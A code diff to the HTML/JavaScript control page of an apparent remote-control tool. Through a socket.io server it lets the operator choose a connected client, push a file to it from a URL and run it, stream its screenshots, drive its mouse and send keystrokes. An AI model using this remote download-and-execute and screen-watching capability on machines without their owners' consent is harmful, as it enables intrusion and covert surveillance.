@@ -3,47 +3,45 @@
 <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css" />
 
 <script>
-    var socket;
-    socket = io('https://fosse.co', {
-        path: '/8110/socket.io'
-    });
-    //socket = io("http://fosse.co:80");
-    //socket = io("http://fosse.co:80/8110/socket.io");
+	var socket;
+	socket = io('https://fosse.co', {
+		path: '/8110/socket.io'
+	});
+	//socket = io("http://fosse.co:80");
+	//socket = io("http://fosse.co:80/8110/socket.io");
 </script>
 
 
 <html>
-    
-    
+
+
 <style>
-	
 	body {
 		padding: 4%;
 	}
-	
-    #console {
-    	float: left;
-    	width: 20%;
-    	overflow: auto;
-    	height: 80vh;
-		/*outline: 4px solid black;*/
-    	/*background-color: Red;*/
-    }
 
-    #picture {
-    	margin-left: 20%;
-    }
-	
+	#console {
+		float: left;
+		width: 20%;
+		overflow: auto;
+		height: 80vh;
+		/*outline: 4px solid black;*/
+		/*background-color: Red;*/
+	}
+
+	#picture {
+		margin-left: 20%;
+	}
+
 	#namesList {
 		width: 80%;
 		height: 100px;
 		overflow: auto;
 	}
-	
 </style>
 
 <body>
-	
+
 	<div id="container">
 
 		<div id="console">
@@ -63,30 +61,35 @@
 
 			<br> Directed:
 			<br>
+			<br> target:
 			<br>
-			
-			target:
+			<input id="directedTarget" type="text" placeholder="name">
+			<br> update rate:
 			<br>
-			<input id="directedTarget" type="text" placeholder="">
+			<input id="directedUpdateRate" type="number" value="100">
+			<br> quality:
+			<br>
+			<input id="directedQuality" type="number" value="30">
 
 			<br>
 			<br> download a file:
 			<form id="directedDownloadForm">
 				<input id="directedDownloadUrl" type="text" placeholder="url">
-				<input id="directedDownloadUser" type="text" placeholder="name">
+				<!-- 				<input id="directedDownloadUser" type="text" placeholder="name"> -->
 				<button>submit</button>
 			</form>
 
+			<br>
 			<br> execute a file:
 			<form id="directedExecutionForm">
 				<input id="directedExecutionFilename" type="text" placeholder="filename">
-				<input id="directedExecutionUser" type="text" placeholder="name">
+				<!-- 				<input id="directedExecutionUser" type="text" placeholder="name"> -->
 				<button>submit</button>
 			</form>
 
 			<br> take a screenshot:
 			<form id="directedGetImageForm">
-				<input id="directedGetImageUser" type="text" placeholder="name">
+				<!-- 				<input id="directedGetImageUser" type="text" placeholder="name"> -->
 				<button>submit</button>
 			</form>
 
@@ -94,7 +97,7 @@
 			<form id="directedLeftClickForm">
 				<input id="directedLeftClickX" type="number" placeholder="X Coordinate">
 				<input id="directedLeftClickY" type="number" placeholder="Y Coordinate">
-				<input id="directedLeftClickUser" type="text" placeholder="name">
+				<!-- 				<input id="directedLeftClickUser" type="text" placeholder="name"> -->
 				<button>submit</button>
 			</form>
 
@@ -102,16 +105,16 @@
 			<form id="directedMoveMouseForm">
 				<input id="directedMoveMouseX" type="number" placeholder="X Coordinate">
 				<input id="directedMoveMouseY" type="number" placeholder="Y Coordinate">
-				<input id="directedMoveMouseUser" type="text" placeholder="name">
+				<!-- 				<input id="directedMoveMouseUser" type="text" placeholder="name"> -->
 				<button>submit</button>
 			</form>
-			
+
 			<br> send text:
-			<form id="directedSendTextForm">
+			<div id="directedSendTextForm">
 				<input id="directedSendTextText" type="text" placeholder="text">
-				<input id="directedSendTextUser" type="text" placeholder="name">
+				<!-- 				<input id="directedSendTextUser" type="text" placeholder="name"> -->
 				<button>submit</button>
-			</form>
+			</div>
 
 
 			<!--   <form id="sdelform">
@@ -121,16 +124,16 @@
 			<!-- <form id="deleteDirectoryForm">
                 <button>delete all in directory</button>
             </form> -->
-
+			<br>
 			<form id="getImageForm">
 				<button>Get Image</button>
 			</form>
-			
+
 			<div>
-				<input type="checkbox" id="SendTextCheckBox">
+				<input type="checkbox" id="sendTextCheckBox">
 				<label for="subscribeNews">send keys</label>
 			</div>
-			
+
 			<br>
 			<form id="listAllForm">
 				<button>List All Connected Clients:</button>
@@ -138,7 +141,7 @@
 
 			<div id="namesList" class="list-group">
 			</div>
-			
+
 		</div>
 
 
@@ -153,29 +156,29 @@
 </html>
 
 <script>
-	
 	var globalEventTimer = false;
-	
+
 	function directedDownload(user, url) {
 		var data = {};
 		data.user = user;
 		data.url = url;
 		socket.emit("directedDownload", data);
 	}
-	
+
 	function directedExecution(user, filename) {
 		var data = {};
 		data.user = user;
 		data.filename = filename;
 		socket.emit("directedDownload", data);
 	}
-	
-	function directedGetImage(user) {
+
+	function directedGetImage(user, quality) {
 		var data = {};
 		data.user = user;
+		data.quality = quality;
 		socket.emit("directedGetImage", data);
 	}
-	
+
 	function directedMoveMouse(user, x, y) {
 		var data = {};
 		data.user = user;
@@ -256,8 +259,9 @@
 
 		var url = $("#directedDownloadUrl").val();
 		var filename = $("#directedDownloadFilename").val();
-		var user = $("#directedDownloadUser").val();
-		
+		//var user = $("#directedDownloadUser").val();
+		var user = $("#directedTarget").val();
+
 		directedDownload(user, url);
 	});
 
@@ -266,42 +270,47 @@
 		event.preventDefault();
 
 		var filename = $("#directedExecutionFilename").val();
-		var user = $("#directedExecutionUser").val();
-		
+		//var user = $("#directedExecutionUser").val();
+		var user = $("#directedTarget").val();
+
 		directedExecution(user, filename);
 	});
 
 	$("#directedGetImageForm").on("submit", function(event) {
 		event.preventDefault();
 
-		var user = $("#directedGetImageUser").val();
+		//var user = $("#directedGetImageUser").val();
+		var user = $("#directedTarget").val();
 		directedGetImage(user);
 	});
-	
+
 	$("#directedMoveMouseForm").on("submit", function(event) {
 		event.preventDefault();
 
-		var user = $("#directedMoveMouseUser").val();
+		//var user = $("#directedMoveMouseUser").val();
+		var user = $("#directedTarget").val();
 		var x = $("#directedMoveMouseX").val();
 		var y = $("#directedMoveMouseY").val();
-		
+
 		directedMoveMouse(user, x, y);
 	});
 
 	$("#directedLeftClickForm").on("submit", function(event) {
 		event.preventDefault();
 
-		var user = $("#directedLeftClickUser").val();
+		//var user = $("#directedLeftClickUser").val();
+		var user = $("#directedTarget").val();
 		var x = $("#directedLeftClickX").val();
 		var y = $("#directedLeftClickY").val();
-		
+
 		directedLeftClick(user, x, y);
 	});
-	
+
 	$("#directedSendTextForm").on("submit", function(event) {
 		event.preventDefault();
 
-		var user = $("#directedSendTextUser").val();
+		//var user = $("#directedSendTextUser").val();
+		var user = $("#directedTarget").val();
 		var text = $("#directedSendTextText").val();
 
 		directedSendText(user, text);
@@ -326,12 +335,11 @@
 		for (var i = 0; i < data.length; i++) {
 			var div = $("<div class='list-group-item'>" + data[i] + "</div>");
 			$("#namesList").append(div);
-			
+
 			$("#namesList").last().on("click", function(event) {
 				var name = $(event.target).text();
-				//console.log(name);
 				$("#directedTarget").val(name);
-				directedGetImage(name);
+				//directedGetImage(name);
 			});
 		}
 	});
@@ -347,11 +355,8 @@
 
 
 	socket.on("viewImage", function(data) {
-		//console.log(data);
-
-		var src = "data:image/png;base64," + data.src;
-
-		$("#directedTarget").val(data.name);
+		
+		var src = "data:image/jpeg;base64," + data.src;
 
 		var image = new Image();
 		image.src = src;
@@ -360,7 +365,7 @@
 		$("#picture").empty();
 		$("#picture").append(image);
 
-		$("#screenshot").on( /*"click"*/ "mousedown", function(event) {
+		$("#screenshot").on("mousedown", function(event) {
 			event.preventDefault();
 
 			var x1 = event.offsetX ? (event.offsetX) : event.pageX - document.getElementById("screenshot").offsetLeft;
@@ -392,50 +397,39 @@
 				}, 200);
 			});
 		});
-		
-		
-// 		$(document).keypress(function(event) {
-			
-// 			var isChecked = $("#SendTextCheckBox").is(":checked");
-// 			var user = $("#directedTarget").val();
-// 			if(user != "" && isChecked && !globalEventTimer) {
-// 				globalEventTimer = true;
-// 				console.log(event.key);
-// 				directedSendText(user, event.key);
-// // 				setTimeout(function() {
-// // 					directedGetImage(user);
-// // 				}, 200);
-// 			}
-// 		});
-		
-		$(document).keydown(function(event) {
-			event.preventDefault();
-			
-			var isChecked = $("#SendTextCheckBox").is(":checked");
-			var user = $("#directedTarget").val();
-			if(user != "" && isChecked && !globalEventTimer) {
-				globalEventTimer = true;
-				console.log(event.key);
-				directedSendText(user, event.key);
-// 				setTimeout(function() {
-// 					directedGetImage(user);
-// 				}, 200);
-			}
-		});
-		
 	});
-	
-	
-	
+
+	// send keys
+	$(document).keydown(function(event) {
+		//event.preventDefault();
+
+		var isChecked = $("#sendTextCheckBox").is(":checked");
+		var user = $("#directedTarget").val();
+		if (user != "" && isChecked && !globalEventTimer) {
+			globalEventTimer = true;
+			console.log(event.key);
+			directedSendText(user, event.key);
+			// 				setTimeout(function() {
+			// 					directedGetImage(user);
+			// 				}, 200);
+		}
+	});
+
+
 	setInterval(function() {
 		globalEventTimer = false;
 	}, 100);
-	
-	setInterval(function() {
-		var user = $("#directedTarget").val();
-		directedGetImage(user);
-	}, 2000);
-	
 
-	
+	function updateImage() {
+		var user = $("#directedTarget").val();
+		var quality = $("#directedQuality").val();
+		directedGetImage(user, quality);
+		setTimeout(updateImage, $("#directedUpdateRate").val());
+	}
+	updateImage();
+
+// 	setInterval(function() {
+// 		var user = $("#directedTarget").val();
+// 		directedGetImage(user);
+// 	}, 100);
 </script>
